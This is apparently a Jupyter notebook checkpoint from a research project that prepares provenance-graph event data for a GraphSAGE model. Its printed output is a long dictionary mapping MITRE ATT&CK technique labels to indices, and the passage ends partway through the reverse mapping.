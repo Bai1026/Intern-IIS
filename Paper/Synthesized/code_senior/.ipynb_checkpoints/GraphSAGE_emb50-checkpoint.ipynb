{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "02f1136c",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_2669961/892649855.py:7: DeprecationWarning: \n",
      "Pyarrow will become a required dependency of pandas in the next major release of pandas (pandas 3.0),\n",
      "(to allow more performant data types, such as the Arrow string type, and better interoperability with other libraries)\n",
      "but was not found to be installed on your system.\n",
      "If this would cause problems for you,\n",
      "please provide us feedback at https://github.com/pandas-dev/pandas/issues/54466\n",
      "        \n",
      "  import pandas as pd\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import json\n",
    "import pickle\n",
    "import random\n",
    "import logging\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from glob import glob\n",
    "from tqdm.notebook import tqdm\n",
    "from sklearn.decomposition import PCA\n",
    "from sklearn.metrics import classification_report\n",
    "\n",
    "import dgl\n",
    "import dgl.nn as dglnn\n",
    "from dgl.nn import GraphConv, GATConv, SAGEConv\n",
    "\n",
    "import torch\n",
    "import torch.nn as nn\n",
    "import torch.nn.functional as F\n",
    "from torch.optim import AdamW, lr_scheduler\n",
    "from torch.utils.data import Dataset, DataLoader\n",
    "from transformers import get_linear_schedule_with_warmup\n",
    "\n",
    "os.environ['CUDA_VISIBLE_DEVICES'] = \"0\"\n",
    "device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n",
    "logging.basicConfig(format='%(asctime)s | %(levelname)s | %(message)s', level=logging.INFO, datefmt='%Y-%m-%d %H:%M:%S') "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "0c4ff748-50ee-47f4-b061-5965fe828e78",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "def build_dictionary(file_path):\n",
    "    with open(file_path, 'r') as file:\n",
    "        next(file)\n",
    "        # 使用正则表达式去除行末的数字\n",
    "        dictionary = {re.sub(r'\\s\\d+$', '', line.strip()): index for index, line in enumerate(file)}\n",
    "    return dictionary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "aeb4978b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# with open(\"./relations.txt\") as fp:\n",
    "#     relations = [r.strip() for r in fp.readlines()]\n",
    "    \n",
    "# with open(\"../data/3_openKE_2/label2id.txt\", \"r\") as fp:\n",
    "#     label2index = fp.load()\n",
    "# with open(\"./index2label.pkl\", \"rb\") as fp:\n",
    "#     index2label = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16c456ce",
   "metadata": {},
   "source": [
    "# Make dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "31b80e89",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_value(event):\n",
    "    global type2attr\n",
    "\n",
    "    srcUUID = event[\"srcNode\"][\"UUID\"]\n",
    "    srcType = event[\"srcNode\"][\"Type\"]\n",
    "    srcAttr = event[\"srcNode\"][type2attr[srcType]]\n",
    "    dstUUID = event[\"dstNode\"][\"UUID\"] if event[\"dstNode\"] != None else srcUUID\n",
    "    dstType = event[\"dstNode\"][\"Type\"] if event[\"dstNode\"] != None else srcType\n",
    "    dstAttr = event[\"dstNode\"][type2attr[dstType]] if event[\"dstNode\"] != None else srcAttr\n",
    "    return srcUUID, srcAttr, dstUUID, dstAttr, event[\"relation\"], event[\"label\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ad9dc377",
   "metadata": {},
   "outputs": [],
   "source": [
    "def make_dataset(dataset):\n",
    "    global node_ent2idx, edge_ent2idx, node_ent2emb, edge_ent2emb\n",
    "\n",
    "    data_list = []\n",
    "    for p in tqdm(dataset):\n",
    "        with open(p) as fp:\n",
    "            events = json.load(fp)\n",
    "            \n",
    "        nodes = set()\n",
    "        edges = []\n",
    "        relations = []\n",
    "        labels = []\n",
    "        uuid2res = {}\n",
    "        for e in events:\n",
    "            srcUUID, srcAttr, dstUUID, dstAttr, rel, label = get_value(e)\n",
    "\n",
    "            uuid2res[srcUUID], uuid2res[dstUUID] = srcAttr, dstAttr\n",
    "            nodes.add(srcUUID)\n",
    "            nodes.add(dstUUID)\n",
    "            edges.append((srcUUID, dstUUID))\n",
    "            relations.append(edge_ent2idx[rel])\n",
    "            labels.append(label2index[label])\n",
    "        nodes = list(nodes)  \n",
    "        node_feat = [torch.tensor(node_ent2emb[node_ent2idx[uuid2res[uuid]]], dtype=torch.float32) for uuid in nodes]\n",
    "        edge_attr = [torch.tensor(edge_ent2emb[idx], dtype=torch.float32) for idx in relations]\n",
    "\n",
    "        src = [nodes.index(src_uuid) for src_uuid, dst_uuid in edges]\n",
    "        dst = [nodes.index(dst_uuid) for src_uuid, dst_uuid in edges]\n",
    "        edge_index = torch.tensor([src, dst], dtype=torch.long)\n",
    "\n",
    "        \n",
    "        data_list.append({\n",
    "            \"labels\": labels,\n",
    "            \"num_nodes\": len(nodes),\n",
    "            \"node_feat\": node_feat,\n",
    "            \"edge_attr\": edge_attr,\n",
    "            \"edge_index\": edge_index\n",
    "        })\n",
    "    return data_list         "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab34d901-efd9-4d82-b363-45d02c98683c",
   "metadata": {},
   "source": [
    "### Directly change the entity to index and change the index into embedding\n",
    "- need ent -> index\n",
    "- need ent -> embedding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d11ca333-c73c-4368-a704-9ae40d6e96f5",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'T1112_34041639e6e501856ecaf5969ee29c76_I': 0,\n",
       " 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I': 1,\n",
       " 'T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B': 2,\n",
       " 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_B': 3,\n",
       " 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I': 4,\n",
       " 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_B': 5,\n",
       " 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_I': 6,\n",
       " 'T1547.001_777043894e42d2aae3881e63f6c76d33_B': 7,\n",
       " 'T1047_f4b0b4129560ea66f9751275e82f6bab_B': 8,\n",
       " 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_B': 9,\n",
       " 'T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69_B': 10,\n",
       " 'T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba_B': 11,\n",
       " 'T1016_921055f4-5970-4707-909e-62f594234d91_B': 12,\n",
       " 'T1003.002_7fa4ea18694f2552547b65e23952cabb_B': 13,\n",
       " 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_I': 14,\n",
       " 'T1564.004_76b6066fe170d38215251102e42be973_I': 15,\n",
       " 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_B': 16,\n",
       " 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_B': 17,\n",
       " 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_I': 18,\n",
       " 'T1003.002_5a484b65c247675e3b7ada4ba648d376_I': 19,\n",
       " 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_I': 20,\n",
       " 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_B': 21,\n",
       " 'T1105_1095434782a00c8a4772a11e625bcf5d_B': 22,\n",
       " 'T1053.005_5db2884b6ca3ab932848f295a3896dc0_B': 23,\n",
       " 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_B': 24,\n",
       " 'T1105_c521e0a70b243a0cf9217907ca3c6d27_B': 25,\n",
       " 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_I': 26,\n",
       " 'T1124_fa6e8607-e0b1-425d-8924-9b894da5a002_B': 27,\n",
       " 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_B': 28,\n",
       " 'T1053.005_ee454be9197890de62705ce6255933fd_B': 29,\n",
       " 'T1204.002_522f3f35cd013e63830fa555495a0081_I': 30,\n",
       " 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_B': 31,\n",
       " 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_I': 32,\n",
       " 'T1115_70795de7cbb842edb029b3378c27c008_I': 33,\n",
       " 'T1562.004_280003641a5cddf916c4f2bf605a71d3_B': 34,\n",
       " 'T1036.004_7de3d7b4922a7b996d8df36fb22bb118_B': 35,\n",
       " 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_I': 36,\n",
       " 'T1562.002_94f51bf01a7036fe02d07b4c18967669_B': 37,\n",
       " 'T1219_7dabcbecab0334b115feefab1630f84a_I': 38,\n",
       " 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_I': 39,\n",
       " 'T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc_B': 40,\n",
       " 'T1057_8adf02e8-6e71-4244-886c-98c402857404_I': 41,\n",
       " 'T1560_a1ee301b0508747b468d578a14e5c1a5_I': 42,\n",
       " 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_I': 43,\n",
       " 'T1546.013_f9a968af61d36983448c74cca5464e17_B': 44,\n",
       " 'T1491_68235976-2404-42a8-9105-68230cfef562_B': 45,\n",
       " 'T1562.002_94f51bf01a7036fe02d07b4c18967669_I': 46,\n",
       " 'T1217_69bbe2183fa09c00ccaac62d48e214f8_I': 47,\n",
       " 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_I': 48,\n",
       " 'T1040_6881a4589710d53f0c146e91db513f01_B': 49,\n",
       " 'T1531_b25ae80dad74142fafb510e9c1949ace_B': 50,\n",
       " 'T1047_6935e41353aa781bb723462d26114c44_B': 51,\n",
       " 'T1018_a44bb43474728496276d5d73aa14588f_B': 52,\n",
       " 'T1547.010_4593d72a5145e3f494421ac772d37464_I': 53,\n",
       " 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_I': 54,\n",
       " 'T1125_da86001b5081fcf773d8e62f22cf2b00_I': 55,\n",
       " 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_B': 56,\n",
       " 'T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c_B': 57,\n",
       " 'T1547.001_163b023f43aba758d36f524d146cb8ea_B': 58,\n",
       " 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_B': 59,\n",
       " 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_B': 60,\n",
       " 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_I': 61,\n",
       " 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_I': 62,\n",
       " 'T1518_8ddfaf982ab359cda13626b870ccb339_B': 63,\n",
       " 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_I': 64,\n",
       " 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_I': 65,\n",
       " 'T1105_e6715e61f5df646692c624b3499384c4_B': 66,\n",
       " 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_B': 67,\n",
       " 'T1486_d82ceb9939d3d920ee550187ad8235c8_I': 68,\n",
       " 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_I': 69,\n",
       " 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_I': 70,\n",
       " 'T1112_257313a3c93e3bb7dfb60d6753b09e34_B': 71,\n",
       " 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_I': 72,\n",
       " 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_B': 73,\n",
       " 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_B': 74,\n",
       " 'T1547.001_777043894e42d2aae3881e63f6c76d33_I': 75,\n",
       " 'T1082_29451844-9b76-4e16-a9ee-d6feab4b24db_B': 76,\n",
       " 'T1490_9e5e4c0655fd1b5be88bd40b8251175f_B': 77,\n",
       " 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_I': 78,\n",
       " 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_B': 79,\n",
       " 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_I': 80,\n",
       " 'T1119_7121cdf93b951311be9d7078c602efdc_I': 81,\n",
       " 'T1105_1095434782a00c8a4772a11e625bcf5d_I': 82,\n",
       " 'T1201_38f6f0e50a6b196140ec40d3dc9cc9e6_B': 83,\n",
       " 'T1564_dedfa0a54c9c13ce5714a0dc2e1f5d1a_B': 84,\n",
       " 'T1112_4bfb5f265a5ce07af6bf10da113af7db_B': 85,\n",
       " 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_I': 86,\n",
       " 'T1562.004_41627f71f968225b9f162cb76d16bd9d_I': 87,\n",
       " 'T1518_8ddfaf982ab359cda13626b870ccb339_I': 88,\n",
       " 'T1112_fd992e8ecfdac9b56dd6868904044827_B': 89,\n",
       " 'T1518.001_33a24ff44719e6ac0614b58f8c9a7c72_B': 90,\n",
       " 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_I': 91,\n",
       " 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_I': 92,\n",
       " 'T1547.010_4593d72a5145e3f494421ac772d37464_B': 93,\n",
       " 'T1069.002_6103e503cb444bc7b4187704f2035708_B': 94,\n",
       " 'T1125_da86001b5081fcf773d8e62f22cf2b00_B': 95,\n",
       " 'T1120_7b9c7afaefa59aab759b49af0d699ac1_I': 96,\n",
       " 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_I': 97,\n",
       " 'T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81_B': 98,\n",
       " 'T1566.001_1afaec09315ab71fdfb167175e8a019a_I': 99,\n",
       " 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_I': 100,\n",
       " 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_I': 101,\n",
       " 'T1123_372e6f46fca18e4f1b43209c20ffafa2_I': 102,\n",
       " 'T1003.002_7fa4ea18694f2552547b65e23952cabb_I': 103,\n",
       " 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_I': 104,\n",
       " 'T1137_12ad9edefc86af07700fbf49bfdac6ba_B': 105,\n",
       " 'T1057_5a39d7ed-45c9-4a79-b581-e5fb99e24f65_B': 106,\n",
       " 'T1112_ba6f6214dbd17c54001e0a163b60f151_I': 107,\n",
       " 'T1562.004_41627f71f968225b9f162cb76d16bd9d_B': 108,\n",
       " 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_B': 109,\n",
       " 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_B': 110,\n",
       " 'T1016_14a21534-350f-4d83-9dd7-3c56b93a0c17_B': 111,\n",
       " 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_I': 112,\n",
       " 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_B': 113,\n",
       " 'T1204.002_522f3f35cd013e63830fa555495a0081_B': 114,\n",
       " 'T1105_c76968acda4aa1673dadcd67f3ab7664_I': 115,\n",
       " 'T1135_530e47c6-8592-42bf-91df-c59ffbd8541b_B': 116,\n",
       " 'T1018_26c8b8b5-7b5b-4de1-a128-7d37fb14f517_B': 117,\n",
       " 'T1547_fe9eeee9a7b339089e5fa634b08522c1_B': 118,\n",
       " 'T1564.004_76b6066fe170d38215251102e42be973_B': 119,\n",
       " 'T1059.003_6c318ef0339d74d909ad556681b6493e_B': 120,\n",
       " 'T1112_cab7b85611a290c0769546bfa9d6f962_I': 121,\n",
       " 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_I': 122,\n",
       " 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_B': 123,\n",
       " 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_I': 124,\n",
       " 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_B': 125,\n",
       " 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_B': 126,\n",
       " 'T1566.001_1afaec09315ab71fdfb167175e8a019a_B': 127,\n",
       " 'T1560_a1ee301b0508747b468d578a14e5c1a5_B': 128,\n",
       " 'T1007_9d03c91bdae5a80f17f89c987942b5a8_B': 129,\n",
       " 'T1033_bd527b63-9f9e-46e0-9816-b8434d2b8989_B': 130,\n",
       " 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_B': 131,\n",
       " 'T1112_e7a987cbef27263e666e5b096488dc55_B': 132,\n",
       " 'T1112_ba6f6214dbd17c54001e0a163b60f151_B': 133,\n",
       " 'T1047_ac2764f7a67a9ce92b54e8e59b361838_B': 134,\n",
       " 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_B': 135,\n",
       " 'T1112_35c0360d226cf38104f300d9d57ce60e_I': 136,\n",
       " 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_B': 137,\n",
       " 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_B': 138,\n",
       " 'T1040_6881a4589710d53f0c146e91db513f01_I': 139,\n",
       " 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_B': 140,\n",
       " 'T1547.004_0856714c9810ac55b53e9964d02958a0_B': 141,\n",
       " 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_B': 142,\n",
       " 'T1546.013_f9a968af61d36983448c74cca5464e17_I': 143,\n",
       " 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_B': 144,\n",
       " 'T1087.001_feaced8f-f43f-452a-9500-a5219488abb8_B': 145,\n",
       " 'T1112_fd992e8ecfdac9b56dd6868904044827_I': 146,\n",
       " 'T1574.001_63bbedafba2f541552ac3579e9e3737b_I': 147,\n",
       " 'T1497.001_1258b063-27d6-489b-a677-4807faacf868_B': 148,\n",
       " 'T1137_12ad9edefc86af07700fbf49bfdac6ba_I': 149,\n",
       " 'T1003_18f31c311ac208802e88ab8d5af8603e_B': 150,\n",
       " 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_B': 151,\n",
       " 'T1112_257313a3c93e3bb7dfb60d6753b09e34_I': 152,\n",
       " 'T1105_e6715e61f5df646692c624b3499384c4_I': 153,\n",
       " 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_B': 154,\n",
       " 'T1201_57296a2ddbeb7423c05feef2fe972111_B': 155,\n",
       " 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_B': 156,\n",
       " 'T1547_fe9eeee9a7b339089e5fa634b08522c1_I': 157,\n",
       " 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_I': 158,\n",
       " 'T1490_e90756bb6dcd21462dc4cc452661df91_B': 159,\n",
       " 'T1547.009_b6e5c895c6709fe289352ee23f062229_B': 160,\n",
       " 'T1007_d6bb2a19da7246731ed9c44831b135f8_B': 161,\n",
       " 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_B': 162,\n",
       " 'T1562.001_43e3334362b140924f001b256b229ee5_B': 163,\n",
       " 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_I': 164,\n",
       " 'T1497.001_5dc841fd-28ad-40e2-b10e-fb007fe09e81_B': 165,\n",
       " 'T1105_4f683658f161ccdc51337c470d32bab9_I': 166,\n",
       " 'T1007_c6607391-d02c-44b5-9b13-d3492ca58599_B': 167,\n",
       " 'T1217_69bbe2183fa09c00ccaac62d48e214f8_B': 168,\n",
       " 'T1112_cd8be0e6b873919da25530a2c7ea6750_I': 169,\n",
       " 'T1531_aa6b15485a5f50ced34d87fda177b758_B': 170,\n",
       " 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_B': 171,\n",
       " 'T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a_B': 172,\n",
       " 'T1083_6e1a53c0-7352-4899-be35-fa7f364d5722_B': 173,\n",
       " 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_B': 174,\n",
       " 'T1016_71b3d2945679566b9d94d8cb11df4b70_B': 175,\n",
       " 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_B': 176,\n",
       " 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_B': 177,\n",
       " 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_B': 178,\n",
       " 'T1562.001_43e3334362b140924f001b256b229ee5_I': 179,\n",
       " 'T1057_8adf02e8-6e71-4244-886c-98c402857404_B': 180,\n",
       " 'T1497.001_7a6ba833-de40-466a-8969-5c37b13603e0_B': 181,\n",
       " 'T1003.001_35d92515122effdd73801c6ac3021da7_B': 182,\n",
       " 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_B': 183,\n",
       " 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_B': 184,\n",
       " 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_I': 185,\n",
       " 'T1490_c156ac5c9fa67080365268d95f29053d_B': 186,\n",
       " 'T1574.001_63bbedafba2f541552ac3579e9e3737b_B': 187,\n",
       " 'T1105_c521e0a70b243a0cf9217907ca3c6d27_I': 188,\n",
       " 'T1112_4bfb5f265a5ce07af6bf10da113af7db_I': 189,\n",
       " 'T1003_18f31c311ac208802e88ab8d5af8603e_I': 190,\n",
       " 'T1547.009_b6e5c895c6709fe289352ee23f062229_I': 191,\n",
       " 'T1087.001_6334877e8e3ba48f7835d4856d90a282_B': 192,\n",
       " 'T1112_e7a987cbef27263e666e5b096488dc55_I': 193,\n",
       " 'T1112_35c0360d226cf38104f300d9d57ce60e_B': 194,\n",
       " 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_I': 195,\n",
       " 'T1490_8467c994685ccf178db166964bd80fab_B': 196,\n",
       " 'T1217_f7a0f7d704aa52a764d9d1bee81e65d6_B': 197,\n",
       " 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_B': 198,\n",
       " 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_I': 199,\n",
       " 'T1486_d82ceb9939d3d920ee550187ad8235c8_B': 200,\n",
       " 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_B': 201,\n",
       " 'T1003.002_5a484b65c247675e3b7ada4ba648d376_B': 202,\n",
       " 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_I': 203,\n",
       " 'T1033_c0da588f-79f0-4263-8998-7496b1a40596_B': 204,\n",
       " 'T1078.001_d0ca00832890baa1d42322cf70fcab1a_B': 205,\n",
       " 'T1547.001_163b023f43aba758d36f524d146cb8ea_I': 206,\n",
       " 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_I': 207,\n",
       " 'T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa_B': 208,\n",
       " 'T1482_cfb61005899996469ae3023796792ca5_B': 209,\n",
       " 'T1003.003_9f73269695e54311dd61dc68940fb3e1_B': 210,\n",
       " 'T1003.003_f049b89533298c2d6cd37a940248b219_B': 211,\n",
       " 'T1047_ed736a123da6fb2aab22cfd4f437e8b5_B': 212,\n",
       " 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_I': 213,\n",
       " 'T1071.001_24c3b7b004401d839a5c337201da3484_I': 214,\n",
       " 'T1105_c76968acda4aa1673dadcd67f3ab7664_B': 215,\n",
       " 'T1491_68235976-2404-42a8-9105-68230cfef562_I': 216,\n",
       " 'T1115_b007fe0c-c6b0-4fda-915c-255bbc070de2_B': 217,\n",
       " 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_B': 218,\n",
       " 'T1490_2d53d6fabd39bf9c70b0dfcdfbbc926d_B': 219,\n",
       " 'T1071.001_24c3b7b004401d839a5c337201da3484_B': 220,\n",
       " 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_I': 221,\n",
       " 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_I': 222,\n",
       " 'T1562.004_5b93df032e230056c21a3e57334f77d1_B': 223,\n",
       " 'T1057_b2a1e430ca6d36eb5af2fe666e769847_B': 224,\n",
       " 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_I': 225,\n",
       " 'T1112_34041639e6e501856ecaf5969ee29c76_B': 226,\n",
       " 'T1087.001_6334877e8e3ba48f7835d4856d90a282_I': 227,\n",
       " 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_B': 228,\n",
       " 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_I': 229,\n",
       " 'T1112_e74d2fb4ef5fa6c766a4151554033697_I': 230,\n",
       " 'T1057_f8de05d1741dcc468f772ab0ff4dac72_B': 231,\n",
       " 'T1564.001_66a5fd5f244819181f074dd082a28905_I': 232,\n",
       " 'T1120_7b9c7afaefa59aab759b49af0d699ac1_B': 233,\n",
       " 'T1003.001_35d92515122effdd73801c6ac3021da7_I': 234,\n",
       " 'T1219_7dabcbecab0334b115feefab1630f84a_B': 235,\n",
       " 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_I': 236,\n",
       " 'T1049_a14392d713dffba6a397682ff83259a0_B': 237,\n",
       " 'T1047_f4b0b4129560ea66f9751275e82f6bab_I': 238,\n",
       " 'T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8_B': 239,\n",
       " 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_B': 240,\n",
       " 'T1047_b0255b5120cbabc062d8d4510a142c3b_B': 241,\n",
       " 'T1112_cd8be0e6b873919da25530a2c7ea6750_B': 242,\n",
       " 'T1112_cab7b85611a290c0769546bfa9d6f962_B': 243,\n",
       " 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_I': 244,\n",
       " 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_I': 245,\n",
       " 'T1518.001_b8453a5fe06b24aea12b27592d5c3d3a_B': 246,\n",
       " 'T1016_921055f4-5970-4707-909e-62f594234d91_I': 247,\n",
       " 'T1018_ac20e592bc912bddff4d6b88289095f0_B': 248,\n",
       " 'T1562.004_5b93df032e230056c21a3e57334f77d1_I': 249,\n",
       " 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_B': 250,\n",
       " 'T1069.001_a1f48fa3ddee658b29b414523c9a295b_B': 251,\n",
       " 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_I': 252,\n",
       " 'T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e_B': 253,\n",
       " 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_I': 254,\n",
       " 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_B': 255,\n",
       " 'T1007_9d03c91bdae5a80f17f89c987942b5a8_I': 256,\n",
       " 'T1564.001_66a5fd5f244819181f074dd082a28905_B': 257,\n",
       " 'O': 258,\n",
       " 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_I': 259,\n",
       " 'T1105_4f683658f161ccdc51337c470d32bab9_B': 260,\n",
       " 'T1047_ac122553ab4426ea3362bb4a97d31bfd_B': 261,\n",
       " 'T1123_372e6f46fca18e4f1b43209c20ffafa2_B': 262,\n",
       " 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_B': 263,\n",
       " 'T1059.003_6c318ef0339d74d909ad556681b6493e_I': 264,\n",
       " 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_B': 265,\n",
       " 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_I': 266,\n",
       " 'T1547.004_0856714c9810ac55b53e9964d02958a0_I': 267,\n",
       " 'T1016_7d8ee68f0e9731db82964f558f614608_B': 268,\n",
       " 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_B': 269,\n",
       " 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_B': 270,\n",
       " 'T1112_e74d2fb4ef5fa6c766a4151554033697_B': 271,\n",
       " 'T1119_7121cdf93b951311be9d7078c602efdc_B': 272,\n",
       " 'T1115_70795de7cbb842edb029b3378c27c008_B': 273}"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_path = '../data/3_openKE_3/label2id.txt'  # 替換為您檔案的路徑\n",
    "label2index = build_dictionary(file_path)\n",
    "\n",
    "label2index"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "09049fca-0895-43d8-be49-3368f7c82ada",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{0: 'T1112_34041639e6e501856ecaf5969ee29c76_I',\n",
       " 1: 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I',\n",
       " 2: 'T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B',\n",
       " 3: 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_B',\n",
       " 4: 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I',\n",
       " 5: 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_B',\n",
       " 6: 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_I',\n",
       " 7: 'T1547.001_777043894e42d2aae3881e63f6c76d33_B',\n",
       " 8: 'T1047_f4b0b4129560ea66f9751275e82f6bab_B',\n",
       " 9: 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_B',\n",
       " 10: 'T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69_B',\n",
       " 11: 'T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba_B',\n",
       " 12: 'T1016_921055f4-5970-4707-909e-62f594234d91_B',\n",
       " 13: 'T1003.002_7fa4ea18694f2552547b65e23952cabb_B',\n",
       " 14: 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_I',\n",
